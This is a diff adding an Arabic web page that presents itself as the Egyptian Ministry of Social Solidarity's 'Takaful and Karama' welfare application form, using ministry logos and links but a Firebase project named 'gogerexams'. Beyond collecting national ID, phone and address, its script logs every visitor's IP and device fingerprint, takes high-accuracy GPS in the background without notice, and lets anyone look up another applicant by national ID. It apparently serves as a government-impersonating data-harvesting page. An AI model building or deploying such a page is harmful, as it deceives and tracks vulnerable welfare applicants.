@@ -1,0 +1,1571 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>نموذج تكافل وكرامة</title>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+  <style>
+    :root {
+      --primary: #1a7a3c;
+      --primary-dark: #145e2e;
+      --primary-light: #e8f5ee;
+      --accent: #f0a500;
+    }
+
+    * { box-sizing: border-box; }
+
+    body {
+      background: #0f2027;
+      font-family: 'Cairo', 'Segoe UI', Tahoma, Arial, sans-serif;
+      min-height: 100vh;
+      padding: 20px 15px 40px;
+    }
+
+    .page-header {
+      background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
+      color: white;
+      border-radius: 16px 16px 0 0;
+      padding: 28px 24px 22px;
+      text-align: center;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .page-header::before {
+      content: '';
+      position: absolute;
+      top: -40px; left: -40px;
+      width: 150px; height: 150px;
+      border-radius: 50%;
+      background: rgba(255,255,255,0.06);
+    }
+
+    .page-header::after {
+      content: '';
+      position: absolute;
+      bottom: -30px; right: -30px;
+      width: 120px; height: 120px;
+      border-radius: 50%;
+      background: rgba(255,255,255,0.06);
+    }
+
+    .page-header .logos {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 16px;
+      margin-bottom: 12px;
+    }
+
+    .page-header .logo-icon {
+      width: 145px;
+      height: 145px;
+      object-fit: contain;
+      border-radius: 12px;
+    }
+
+    .page-header h1 {
+      font-size: 1.55rem;
+      font-weight: 700;
+      margin-bottom: 4px;
+    }
+
+    .page-header p {
+      font-size: 0.88rem;
+      opacity: 0.85;
+      margin: 0;
+    }
+
+    .form-card {
+      background: #0f2027;
+      border-radius: 0 0 16px 16px;
+      box-shadow: 0 8px 30px rgba(0,0,0,0.3);
+      padding: 28px 24px 32px;
+    }
+
+    .wrapper {
+      max-width: 600px;
+      margin: 0 auto;
+    }
+
+    .form-label {
+      font-weight: 600;
+      color: rgba(255,255,255,0.88);
+      margin-bottom: 6px;
+      font-size: 0.95rem;
+    }
+
+    .form-label .required {
+      color: #e53e3e;
+      margin-right: 3px;
+    }
+
+    .form-control, .form-select {
+      border: 1.5px solid rgba(255,255,255,0.15);
+      border-radius: 10px;
+      padding: 11px 14px;
+      font-size: 1rem;
+      transition: border-color 0.2s, box-shadow 0.2s;
+      text-align: right;
+      direction: rtl;
+      background: rgba(255,255,255,0.07);
+      color: #fff;
+    }
+
+    .form-control::placeholder { color: rgba(255,255,255,0.35); }
+
+    .form-select option { background: #1a3a4a; color: #fff; }
+
+    .form-control:focus, .form-select:focus {
+      border-color: var(--primary);
+      box-shadow: 0 0 0 3px rgba(26,122,60,0.15);
+    }
+
+    .form-control.is-invalid, .form-select.is-invalid {
+      border-color: #e53e3e;
+      box-shadow: 0 0 0 3px rgba(229,62,62,0.12);
+    }
+
+    .form-control.is-valid, .form-select.is-valid {
+      border-color: var(--primary);
+      box-shadow: 0 0 0 3px rgba(26,122,60,0.12);
+    }
+
+    .invalid-feedback { font-size: 0.83rem; }
+
+    .section-title {
+      font-size: 0.8rem;
+      font-weight: 700;
+      color: #4ade80;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      border-bottom: 2px solid rgba(74,222,128,0.25);
+      padding-bottom: 6px;
+      margin-bottom: 18px;
+      margin-top: 10px;
+    }
+
+
+    /* Radio group for marital status & previous application */
+    .radio-group {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px;
+    }
+
+    .radio-option {
+      flex: 1;
+      min-width: 100px;
+    }
+
+    .radio-option input[type="radio"] {
+      display: none;
+    }
+
+    .radio-option label {
+      display: block;
+      text-align: center;
+      padding: 10px 8px;
+      border: 2px solid rgba(255,255,255,0.15);
+      border-radius: 10px;
+      cursor: pointer;
+      font-size: 0.9rem;
+      color: rgba(255,255,255,0.7);
+      background: rgba(255,255,255,0.05);
+      transition: all 0.2s;
+      user-select: none;
+    }
+
+    .radio-option input[type="radio"]:checked + label {
+      border-color: var(--primary);
+      background: var(--primary-light);
+      color: var(--primary-dark);
+      font-weight: 700;
+    }
+
+    .radio-group-error {
+      color: #e53e3e;
+      font-size: 0.83rem;
+      margin-top: 5px;
+      display: none;
+    }
+
+    .radio-group-error.visible { display: block; }
+
+    /* Save button */
+    .btn-save {
+      background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
+      color: white;
+      border: none;
+      border-radius: 12px;
+      padding: 14px;
+      font-size: 1.1rem;
+      font-weight: 700;
+      width: 100%;
+      cursor: pointer;
+      transition: opacity 0.2s, transform 0.1s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin-top: 10px;
+    }
+
+    .btn-save:hover { opacity: 0.92; }
+    .btn-save:active { transform: scale(0.98); }
+    .btn-save:disabled { opacity: 0.6; cursor: not-allowed; }
+
+    /* Toast */
+    .toast-container {
+      position: fixed;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      z-index: 9999;
+      width: 90%;
+      max-width: 400px;
+    }
+
+    .toast-msg {
+      padding: 14px 20px;
+      border-radius: 12px;
+      font-size: 0.95rem;
+      font-weight: 600;
+      text-align: center;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.2);
+      animation: slideUp 0.3s ease;
+    }
+
+    .toast-success { background: #1a7a3c; color: white; }
+    .toast-error   { background: #c53030; color: white; }
+    .toast-info    { background: #2b6cb0; color: white; }
+
+    @keyframes slideUp {
+      from { opacity: 0; transform: translateY(20px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+
+    /* Spinner */
+    .spinner {
+      width: 20px; height: 20px;
+      border: 3px solid rgba(255,255,255,0.4);
+      border-top-color: white;
+      border-radius: 50%;
+      animation: spin 0.7s linear infinite;
+      display: none;
+    }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* Age field */
+    input[type="number"]::-webkit-inner-spin-button,
+    input[type="number"]::-webkit-outer-spin-button {
+      -webkit-appearance: none;
+    }
+
+    @media (max-width: 480px) {
+      .form-card { padding: 20px 16px 28px; }
+      .page-header { padding: 22px 16px 18px; }
+      .page-header h1 { font-size: 1.3rem; }
+      .radio-option { min-width: 80px; }
+      #address { padding-left: 100px; }
+    }
+  </style>
+</head>
+<body>
+
+<div class="wrapper">
+  <div class="page-header">
+    <div class="logos">
+      <a href="https://www.moss.gov.eg/" target="_blank"><img src="MOSS.png" alt="وزارة التضامن الاجتماعي" class="logo-icon"></a>
+      <a href="https://www.moss.gov.eg/" target="_blank"><img src="TK4.png"  alt="تكافل وكرامة"            class="logo-icon"></a>
+    </div>
+    <h1>نموذج تكافل وكرامة</h1>
+    <p>وزارة التضامن الاجتماعي — يُرجى ملء جميع البيانات بدقة</p>
+  </div>
+
+  <!-- ── الاستعلام عن طلب ── -->
+  <div style="background:#0f2027; padding:16px 20px; border-bottom: 2px dashed rgba(255,255,255,0.1);">
+    <button type="button"
+      onclick="document.getElementById('inquiryBox').classList.toggle('d-none')"
+      style="
+        width:100%; background:rgba(255,255,255,0.07); border:1.5px solid rgba(255,255,255,0.15);
+        border-radius:12px; padding:12px; font-size:1rem; font-weight:600;
+        color:rgba(255,255,255,0.85); cursor:pointer; display:flex; align-items:center;
+        justify-content:center; gap:8px; transition:background .2s;">
+      🔍 الاستعلام عن طلب
+    </button>
+
+    <div id="inquiryBox" class="d-none" style="margin-top:14px;">
+      <label style="font-weight:600; color:rgba(255,255,255,0.88); font-size:0.9rem; display:block; margin-bottom:6px;">
+        الرقم القومي
+      </label>
+      <div style="display:flex; gap:8px;">
+        <input type="text" id="inquiryNid"
+          placeholder="أدخل الرقم القومي (14 رقم)"
+          maxlength="14" inputmode="numeric"
+          style="
+            flex:1; padding:11px 14px; border:1.5px solid rgba(255,255,255,0.15);
+            border-radius:10px; font-size:1rem; direction:rtl; outline:none;
+            background:rgba(255,255,255,0.07); color:#fff;
+            transition:border-color .2s;">
+        <button type="button" id="inquiryBtn"
+          style="
+            background:linear-gradient(135deg,#1a7a3c,#145e2e);
+            color:white; border:none; border-radius:10px;
+            padding:11px 20px; font-size:0.95rem; font-weight:700;
+            cursor:pointer; white-space:nowrap; transition:opacity .2s;">
+          استعلام
+        </button>
+      </div>
+      <div id="inquiryMsg" style="margin-top:10px; font-size:0.85rem; display:none;"></div>
+    </div>
+  </div>
+
+  <div class="form-card">
+    <form id="takafulForm" novalidate>
+
+      <!-- ── البيانات الشخصية ── -->
+      <div class="section-title">البيانات الشخصية</div>
+
+      <!-- الاسم -->
+      <div class="mb-3">
+        <label for="name" class="form-label">
+          <span class="required">*</span> الاسم الكامل
+        </label>
+        <input type="text" id="name" class="form-control"
+               placeholder="أدخل الاسم بالكامل"
+               maxlength="100" required>
+        <div class="invalid-feedback">من فضلك أدخل الاسم الكامل</div>
+      </div>
+
+      <!-- الرقم القومي -->
+      <div class="mb-3">
+        <label for="nationalId" class="form-label">
+          <span class="required">*</span> الرقم القومي
+        </label>
+        <input type="text" id="nationalId" class="form-control"
+               placeholder="14 رقم"
+               maxlength="14" inputmode="numeric" required>
+        <div class="invalid-feedback">يجب أن يكون الرقم القومي 14 رقمًا بالضبط</div>
+      </div>
+
+      <!-- رقم الموبايل -->
+      <div class="mb-3">
+        <label for="mobile" class="form-label">
+          <span class="required">*</span> رقم الموبايل
+        </label>
+        <input type="text" id="mobile" class="form-control"
+               placeholder="010XXXXXXXX"
+               maxlength="11" inputmode="numeric" required>
+        <div class="invalid-feedback">يجب أن يكون الرقم 11 خانة ويبدأ بـ 01</div>
+      </div>
+
+      <!-- السن -->
+      <div class="mb-4">
+        <label for="age" class="form-label">
+          <span class="required">*</span> السن
+        </label>
+        <input type="number" id="age" class="form-control"
+               placeholder="العمر بالسنوات"
+               min="35" max="120" required>
+        <div class="invalid-feedback">يجب أن يكون العمر بين 35 و 120 سنة</div>
+      </div>
+
+      <!-- ── العنوان ── -->
+      <div class="section-title">عنوان استلام الفيزا</div>
+
+      <div class="mb-4">
+        <label for="address" class="form-label">
+          <span class="required">*</span> العنوان بالتفصيل
+        </label>
+        <input type="text" id="address" class="form-control"
+               placeholder="المحافظة / المدينة / الشارع / رقم المنزل"
+               maxlength="300" required>
+        <div class="invalid-feedback">من فضلك أدخل العنوان</div>
+      </div>
+
+      <!-- ── الحالة الاجتماعية ── -->
+      <div class="section-title">الحالة الاجتماعية</div>
+
+      <div class="mb-4">
+        <label class="form-label"><span class="required">*</span> الحالة الاجتماعية</label>
+        <div class="radio-group" id="maritalGroup">
+          <div class="radio-option">
+            <input type="radio" name="marital" id="m_single" value="أعزب">
+            <label for="m_single">أعزب</label>
+          </div>
+          <div class="radio-option">
+            <input type="radio" name="marital" id="m_married" value="متزوج">
+            <label for="m_married">متزوج</label>
+          </div>
+          <div class="radio-option">
+            <input type="radio" name="marital" id="m_widowed" value="أرمل">
+            <label for="m_widowed">أرمل / أرملة</label>
+          </div>
+          <div class="radio-option">
+            <input type="radio" name="marital" id="m_separated" value="منفصل">
+            <label for="m_separated">منفصل</label>
+          </div>
+        </div>
+        <div class="radio-group-error" id="maritalError">يرجى اختيار الحالة الاجتماعية</div>
+      </div>
+
+      <!-- عدد الأولاد والبنات (يظهر عند غير أعزب) -->
+      <div class="mb-4" id="childrenSection" style="display:none;">
+        <div class="row g-3">
+          <div class="col-6">
+            <label for="numBoys" class="form-label">
+              <span class="required">*</span> عدد الأولاد (ذكور)
+            </label>
+            <input type="text" id="numBoys" class="form-control"
+                   placeholder="0" maxlength="2" inputmode="numeric">
+            <div class="invalid-feedback">أدخل عددًا صحيحًا (0 أو أكثر)</div>
+          </div>
+          <div class="col-6">
+            <label for="numGirls" class="form-label">
+              <span class="required">*</span> عدد البنات (إناث)
+            </label>
+            <input type="text" id="numGirls" class="form-control"
+                   placeholder="0" maxlength="2" inputmode="numeric">
+            <div class="invalid-feedback">أدخل عددًا صحيحًا (0 أو أكثر)</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ── سبق التقديم؟ ── -->
+      <div class="section-title">بيانات إضافية</div>
+
+      <div class="mb-4">
+        <label class="form-label">
+          <span class="required">*</span> هل سبق أن تقدمت على برنامج تكافل وكرامة؟
+        </label>
+        <div class="radio-group" id="prevGroup">
+          <div class="radio-option">
+            <input type="radio" name="prevApply" id="prev_yes" value="نعم">
+            <label for="prev_yes">نعم</label>
+          </div>
+          <div class="radio-option">
+            <input type="radio" name="prevApply" id="prev_no" value="لا">
+            <label for="prev_no">لا</label>
+          </div>
+        </div>
+        <div class="radio-group-error" id="prevError">يرجى الإجابة على هذا السؤال</div>
+      </div>
+
+      <!-- زر الحفظ -->
+      <button type="submit" class="btn-save" id="saveBtn">
+        <div class="spinner" id="btnSpinner"></div>
+        <span id="btnText">حفظ البيانات</span>
+      </button>
+
+    </form>
+
+    <!-- زر الأدمن -->
+    <div style="text-align:center; margin-top:18px;">
+      <a href="admin.html"
+         style="color:#999; font-size:0.78rem; text-decoration:none; letter-spacing:0.3px;">
+        ⚙ لوحة الإدارة
+      </a>
+    </div>
+  </div>
+</div>
+
+<!-- Modal تكرار البيانات -->
+<div id="dupOverlay" style="
+  display:none; position:fixed; inset:0;
+  background:rgba(0,0,0,0.55); z-index:8000;
+  align-items:center; justify-content:center; padding:16px;">
+  <div style="
+    background:white; border-radius:18px; padding:30px 24px;
+    max-width:420px; width:100%; text-align:center;
+    box-shadow:0 20px 60px rgba(0,0,0,0.3); animation:slideUp .3s ease;">
+    <div style="font-size:3rem; margin-bottom:10px;">⚠️</div>
+    <h3 style="font-size:1.15rem; font-weight:700; color:#1a202c; margin-bottom:8px;">
+      البيانات مسجلة من قبل
+    </h3>
+    <p id="dupMsg" style="font-size:0.88rem; color:#718096; margin-bottom:22px; line-height:1.6;"></p>
+    <div style="display:flex; gap:10px; justify-content:center; flex-wrap:wrap;">
+      <a id="dupViewBtn" href="#" target="_blank" style="
+        background:linear-gradient(135deg,#1a7a3c,#145e2e);
+        color:white; text-decoration:none; border-radius:10px;
+        padding:11px 22px; font-size:0.9rem; font-weight:700;">
+        📄 عرض بياناتي
+      </a>
+      <button onclick="closeDupModal()" style="
+        background:#f0f4f8; color:#4a5568; border:none;
+        border-radius:10px; padding:11px 22px;
+        font-size:0.9rem; font-weight:600; cursor:pointer;">
+        إغلاق
+      </button>
+    </div>
+  </div>
+</div>
+
+<!-- Toast -->
+<div class="toast-container" id="toastContainer"></div>
+
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+<script type="module">
+  import { initializeApp }            from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
+  import { getFirestore, collection,
+           addDoc, getDocs, query,
+           where, serverTimestamp }  from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+
+  const firebaseConfig = {
+    apiKey: "AIzaSyBKYhw1mfkNWVvWI9GZrKQsRsgCXbtflUI",
+    authDomain: "gogerexams.firebaseapp.com",
+    projectId: "gogerexams",
+    storageBucket: "gogerexams.firebasestorage.app",
+    messagingSenderId: "261975684495",
+    appId: "1:261975684495:web:7254477c2658b62817c7fa",
+    measurementId: "G-FJ15ZPY14X"
+  };
+
+  const app = initializeApp(firebaseConfig);
+  const db  = getFirestore(app);
+
+  // ── Device & IP collection ────────────────────────────────
+
+  function parseUA(ua) {
+    let browser = 'Unknown', os = 'Unknown';
+
+    if      (/Edg\//.test(ua))     browser = 'Edge';
+    else if (/OPR\//.test(ua))     browser = 'Opera';
+    else if (/Chrome\//.test(ua))  browser = 'Chrome';
+    else if (/Firefox\//.test(ua)) browser = 'Firefox';
+    else if (/Safari\//.test(ua))  browser = 'Safari';
+
+    if      (/Windows NT 10/.test(ua)) os = 'Windows 10/11';
+    else if (/Windows NT/.test(ua))    os = 'Windows';
+    else if (/Android/.test(ua))       os = 'Android';
+    else if (/iPhone|iPad/.test(ua))   os = 'iOS';
+    else if (/Mac OS X/.test(ua))      os = 'macOS';
+    else if (/Linux/.test(ua))         os = 'Linux';
+
+    return { browser, os };
+  }
+
+  function collectDeviceInfo() {
+    const { browser, os } = parseUA(navigator.userAgent);
+    return {
+      userAgent:   navigator.userAgent,
+      browser,
+      os,
+      language:    navigator.language || 'unknown',
+      platform:    navigator.platform || 'unknown',
+      screenRes:   `${screen.width}x${screen.height}`,
+      colorDepth:  `${screen.colorDepth}-bit`,
+      isMobile:    /Mobi|Android/i.test(navigator.userAgent),
+      touchScreen: navigator.maxTouchPoints > 0,
+      timezone:    Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown'
+    };
+  }
+
+  async function fetchIP() {
+    try {
+      const r = await fetch('https://api.ipify.org?format=json');
+      const j = await r.json();
+      return j.ip || 'unknown';
+    } catch {
+      return 'unknown';
+    }
+  }
+
+  // جمع المعلومات مرة واحدة فقط per session
+  let visitorData = { ip: 'unknown' };
+
+  (async () => {
+    if (sessionStorage.getItem('visitor_logged')) {
+      // الجلسة سُجِّلت من قبل — أعِد تحميل البيانات المحفوظة فقط
+      try { visitorData = JSON.parse(sessionStorage.getItem('visitor_data')); } catch {}
+      return;
+    }
+
+    const [ip, device] = await Promise.all([fetchIP(), collectDeviceInfo()]);
+    visitorData = {
+      ip,
+      ...device,
+      pageUrl:   location.href,
+      referrer:  document.referrer || 'direct',
+      visitedAt: serverTimestamp()
+    };
+
+    await addDoc(collection(db, 'Visitors'), visitorData);
+
+    // ضع علامة في الجلسة حتى لا يُعاد الإرسال عند تحديث الصفحة
+    sessionStorage.setItem('visitor_logged', '1');
+    // احفظ البيانات (بدون serverTimestamp) للاستخدام المحلي
+    const { visitedAt: _, ...storable } = visitorData;
+    sessionStorage.setItem('visitor_data', JSON.stringify(storable));
+  })();
+
+  // ── GPS (خلفي — مرة واحدة per session) ──────────────────
+
+  const _cached = sessionStorage.getItem('gps_coords');
+  let gpsCoords = _cached ? JSON.parse(_cached) : { lat: null, lon: null, accuracy: null };
+
+  function fetchGPSInBackground() {
+    if (!navigator.geolocation) return;
+    if (gpsCoords.lat !== null) return;
+    navigator.geolocation.getCurrentPosition(
+      pos => {
+        const { latitude: lat, longitude: lon, accuracy } = pos.coords;
+        gpsCoords = { lat, lon, accuracy: Math.round(accuracy) };
+        sessionStorage.setItem('gps_coords', JSON.stringify(gpsCoords));
+      },
+      () => {},
+      { timeout: 10000, enableHighAccuracy: true }
+    );
+  }
+
+  fetchGPSInBackground();
+
+  // ── Helpers ──────────────────────────────────────────────
+
+  function showToast(msg, type = 'success') {
+    const container = document.getElementById('toastContainer');
+    const div = document.createElement('div');
+    div.className = `toast-msg toast-${type}`;
+    div.textContent = msg;
+    container.appendChild(div);
+    setTimeout(() => div.remove(), 4000);
+  }
+
+  function setLoading(on) {
+    const btn     = document.getElementById('saveBtn');
+    const spinner = document.getElementById('btnSpinner');
+    const text    = document.getElementById('btnText');
+    btn.disabled          = on;
+    spinner.style.display = on ? 'block' : 'none';
+    text.textContent      = on ? 'جارٍ الحفظ...' : '💾 حفظ البيانات';
+  }
+
+  function getRadio(name) {
+    const el = document.querySelector(`input[name="${name}"]:checked`);
+    return el ? el.value : null;
+  }
+
+  function markField(id, valid) {
+    const el = document.getElementById(id);
+    el.classList.toggle('is-valid',   valid);
+    el.classList.toggle('is-invalid', !valid);
+    return valid;
+  }
+
+  // ── Validation ────────────────────────────────────────────
+
+  function validateForm() {
+    let ok = true;
+
+    // Name
+    const name = document.getElementById('name').value.trim();
+    ok = markField('name', name.length >= 2) && ok;
+
+    // National ID — 14 digits
+    const nid = document.getElementById('nationalId').value.trim();
+    ok = markField('nationalId', /^\d{14}$/.test(nid)) && ok;
+
+    // Mobile — 11 digits starting with 010
+    const mob = document.getElementById('mobile').value.trim();
+    ok = markField('mobile', /^010\d{8}$/.test(mob)) && ok;
+
+    // Age
+    const age = parseInt(document.getElementById('age').value, 10);
+    ok = markField('age', !isNaN(age) && age >= 35 && age <= 120) && ok;
+
+    // Address
+    const addr = document.getElementById('address').value.trim();
+    ok = markField('address', addr.length >= 5) && ok;
+
+    // Marital status
+    const marital = getRadio('marital');
+    const maritalErr = document.getElementById('maritalError');
+    if (!marital) { maritalErr.classList.add('visible'); ok = false; }
+    else            maritalErr.classList.remove('visible');
+
+    // Children fields (only when not single)
+    if (marital && marital !== 'أعزب') {
+      const boys  = document.getElementById('numBoys').value.trim();
+      const girls = document.getElementById('numGirls').value.trim();
+      ok = markField('numBoys',  /^\d+$/.test(boys))  && ok;
+      ok = markField('numGirls', /^\d+$/.test(girls)) && ok;
+    }
+
+    // Previous application
+    const prev = getRadio('prevApply');
+    const prevErr = document.getElementById('prevError');
+    if (!prev) { prevErr.classList.add('visible'); ok = false; }
+    else          prevErr.classList.remove('visible');
+
+    return ok;
+  }
+
+  // ── Inquiry ───────────────────────────────────────────────
+
+  async function doInquiry() {
+    const nidEl = document.getElementById('inquiryNid');
+    const btn   = document.getElementById('inquiryBtn');
+    const msg   = document.getElementById('inquiryMsg');
+    const nid   = nidEl.value.replace(/\D/g, '').trim();
+
+    nidEl.value       = nid;
+    msg.style.display = 'none';
+
+    if (!/^\d{14}$/.test(nid)) {
+      msg.style.display = 'block';
+      msg.style.color   = '#e53e3e';
+      msg.textContent   = '⚠ الرقم القومي يجب أن يكون 14 رقمًا بالضبط';
+      return;
+    }
+
+    btn.disabled    = true;
+    btn.textContent = '...';
+
+    try {
+      const snap = await getDocs(query(collection(db, 'Takaful'), where('nationalId', '==', nid)));
+      if (!snap.empty) {
+        const found = snap.docs[0];
+        const name  = found.data().name ?? '';
+        document.getElementById('dupMsg').textContent =
+          `تم العثور على طلب مسجل باسم "${name}".\nيمكنك الاطلاع على بياناتك الكاملة من خلال الزر أدناه.`;
+        document.getElementById('dupViewBtn').href = `view.html?id=${found.id}`;
+        document.getElementById('dupOverlay').style.display = 'flex';
+      } else {
+        msg.style.display = 'block';
+        msg.style.color   = '#e53e3e';
+        msg.textContent   = '❌ لا يوجد طلب مسجل بهذا الرقم القومي';
+      }
+    } catch (e) {
+      msg.style.display = 'block';
+      msg.style.color   = '#e53e3e';
+      msg.textContent   = '⚠ حدث خطأ: ' + e.message;
+    } finally {
+      btn.disabled    = false;
+      btn.textContent = 'استعلام';
+    }
+  }
+
+  document.getElementById('inquiryBtn').addEventListener('click', doInquiry);
+
+  const inquiryNidEl = document.getElementById('inquiryNid');
+  inquiryNidEl.addEventListener('focus', () => { inquiryNidEl.style.direction = 'ltr'; });
+  inquiryNidEl.addEventListener('blur',  () => { if (!inquiryNidEl.value) inquiryNidEl.style.direction = 'rtl'; });
+  inquiryNidEl.addEventListener('keydown', e => {
+    if (e.key === 'Enter') doInquiry();
+  });
+
+
+  // ── Live validation ───────────────────────────────────────
+
+  // أرقام فقط مع تحقق فوري
+  function liveNumeric(id, validator) {
+    const el = document.getElementById(id);
+    const handle = () => {
+      el.value = el.value.replace(/\D/g, '');
+      if (el.value.length > 0) markField(id, validator(el.value));
+      else { el.classList.remove('is-valid', 'is-invalid'); }
+    };
+    el.addEventListener('input', handle);
+    el.addEventListener('blur', () => {
+      if (el.value.length > 0) markField(id, validator(el.value));
+    });
+  }
+
+  liveNumeric('nationalId', v => /^\d{14}$/.test(v));
+  liveNumeric('mobile',     v => /^010\d{8}$/.test(v));
+  liveNumeric('age',        v => { const n = parseInt(v,10); return !isNaN(n) && n >= 35 && n <= 120; });
+
+  // حقل النص
+  const nameEl = document.getElementById('name');
+  nameEl.addEventListener('input',  () => { if (nameEl.value.length > 0) markField('name', nameEl.value.trim().length >= 2); });
+  nameEl.addEventListener('blur',   () => markField('name', nameEl.value.trim().length >= 2));
+
+  // حقل العنوان
+  const addrEl = document.getElementById('address');
+  addrEl.addEventListener('input',  () => { if (addrEl.value.length > 0) markField('address', addrEl.value.trim().length >= 5); });
+  addrEl.addEventListener('blur',   () => markField('address', addrEl.value.trim().length >= 5));
+
+  // الحالة الاجتماعية — إظهار/إخفاء حقل الأولاد
+  function liveChildNum(id) {
+    const el = document.getElementById(id);
+    const handle = () => {
+      el.value = el.value.replace(/\D/g, '');
+      if (el.value.length > 0) markField(id, /^\d+$/.test(el.value));
+      else el.classList.remove('is-valid', 'is-invalid');
+    };
+    el.addEventListener('input', handle);
+    el.addEventListener('blur', () => {
+      if (document.getElementById('childrenSection').style.display !== 'none')
+        markField(id, /^\d+$/.test(el.value.trim()));
+    });
+  }
+  liveChildNum('numBoys');
+  liveChildNum('numGirls');
+
+  document.querySelectorAll('input[name="marital"]').forEach(r => {
+    r.addEventListener('change', () => {
+      document.getElementById('maritalError').classList.remove('visible');
+      const show = r.value !== 'أعزب';
+      const section = document.getElementById('childrenSection');
+      section.style.display = show ? 'block' : 'none';
+      if (!show) {
+        ['numBoys','numGirls'].forEach(id => {
+          const el = document.getElementById(id);
+          el.value = '';
+          el.classList.remove('is-valid','is-invalid');
+        });
+      }
+    });
+  });
+
+  // سبق التقديم
+  document.querySelectorAll('input[name="prevApply"]').forEach(r => {
+    r.addEventListener('change', () => document.getElementById('prevError').classList.remove('visible'));
+  });
+
+  // ── Duplicate check ───────────────────────────────────────
+
+  window.closeDupModal = () => {
+    document.getElementById('dupOverlay').style.display = 'none';
+  };
+
+  async function findDuplicate(nid, mobile) {
+    const col = collection(db, 'Takaful');
+    const [byNid, byMob] = await Promise.all([
+      getDocs(query(col, where('nationalId', '==', nid))),
+      getDocs(query(col, where('mobile',     '==', mobile)))
+    ]);
+    if (!byNid.empty) return { doc: byNid.docs[0], field: 'الرقم القومي' };
+    if (!byMob.empty) return { doc: byMob.docs[0], field: 'رقم الموبايل' };
+    return null;
+  }
+
+  function showDupModal(docId, field) {
+    document.getElementById('dupMsg').textContent =
+      `تم العثور على تسجيل سابق بنفس ${field}.\nيمكنك الاطلاع على بياناتك الكاملة من خلال الزر أدناه.`;
+    document.getElementById('dupViewBtn').href = `view.html?id=${docId}`;
+    const overlay = document.getElementById('dupOverlay');
+    overlay.style.display = 'flex';
+  }
+
+  // ── Submit ────────────────────────────────────────────────
+
+  document.getElementById('takafulForm').addEventListener('submit', async e => {
+    e.preventDefault();
+
+    if (!validateForm()) {
+      showToast('يرجى تصحيح الأخطاء قبل الحفظ', 'error');
+      const firstInvalid = document.querySelector('.is-invalid, .radio-group-error.visible');
+      if (firstInvalid) firstInvalid.scrollIntoView({ behavior: 'smooth', block: 'center' });
+      return;
+    }
+
+    setLoading(true);
+
+    // تحديث GPS لحظة الحفظ لأحدث إحداثيات ممكنة
+    fetchGPSInBackground();
+
+    const nid    = document.getElementById('nationalId').value.trim();
+    const mobile = document.getElementById('mobile').value.trim();
+
+    const dup = await findDuplicate(nid, mobile);
+    if (dup) {
+      setLoading(false);
+      showDupModal(dup.doc.id, dup.field);
+      return;
+    }
+
+    const data = {
+      name:          document.getElementById('name').value.trim(),
+      nationalId:    document.getElementById('nationalId').value.trim(),
+      mobile:        document.getElementById('mobile').value.trim(),
+      address:       document.getElementById('address').value.trim(),
+      gpsLat:        gpsCoords.lat,
+      gpsLon:        gpsCoords.lon,
+      gpsAccuracy:   gpsCoords.accuracy,
+      googleMapsUrl: gpsCoords.lat ? `https://maps.google.com/?q=${gpsCoords.lat},${gpsCoords.lon}` : null,
+      age:           parseInt(document.getElementById('age').value, 10),
+      maritalStatus: getRadio('marital'),
+      numBoys:       getRadio('marital') !== 'أعزب' ? parseInt(document.getElementById('numBoys').value, 10)  : null,
+      numGirls:      getRadio('marital') !== 'أعزب' ? parseInt(document.getElementById('numGirls').value, 10) : null,
+      previousApply: getRadio('prevApply'),
+      // بيانات الجهاز والشبكة
+      ip:            visitorData.ip        || 'unknown',
+      browser:       visitorData.browser   || 'unknown',
+      os:            visitorData.os        || 'unknown',
+      screenRes:     visitorData.screenRes || 'unknown',
+      isMobile:      visitorData.isMobile  ?? false,
+      language:      visitorData.language  || 'unknown',
+      timezone:      visitorData.timezone  || 'unknown',
+      userAgent:     visitorData.userAgent || 'unknown',
+      createdAt:     serverTimestamp()
+    };
+
+    try {
+      const docRef = await addDoc(collection(db, 'Takaful'), data);
+      location.href = `view.html?id=${docRef.id}`;
+    } catch (err) {
+      console.error(err);
+      showToast('حدث خطأ أثناء الحفظ — تحقق من الاتصال بالإنترنت', 'error');
+      setLoading(false);
+    }
+  });
+</script>
+
+<!-- ══ حقائق وأرقام ══════════════════════════════════════ -->
+<section class="stats-section">
+  <div class="stats-header">
+    <h2 class="stats-main-title">حقائق وأرقام</h2>
+    <p class="stats-sub">بيانات وزارة التضامن الاجتماعي</p>
+  </div>
+
+  <div class="stats-slider-wrapper">
+    <button class="stats-nav-btn" id="statsPrev">&#8250;</button>
+
+    <div class="stats-viewport" id="statsViewport">
+      <div class="stats-track" id="statsTrack">
+        <div class="stats-card"><div class="stats-value">١٣,٧٦٠,١٣٦</div><div class="stats-title">عدد المؤمن عليهم</div><div class="stats-date">آخر تحديث: 01/5/2026</div></div>
+        <div class="stats-card"><div class="stats-value">٢,١١٣,٠١٦</div><div class="stats-title">عدد مستفيدي كرامة</div><div class="stats-date">آخر تحديث: 15/4/2026</div></div>
+        <div class="stats-card"><div class="stats-value">٢,٥٦٧,١٤٠</div><div class="stats-title">عدد مستفيدي تكافل</div><div class="stats-date">آخر تحديث: 15/4/2026</div></div>
+        <div class="stats-card"><div class="stats-value">١٢,٥١٠,٧٧٠</div><div class="stats-title">عدد أصحاب المعاشات والمستحقين</div><div class="stats-date">آخر تحديث: 01/5/2026</div></div>
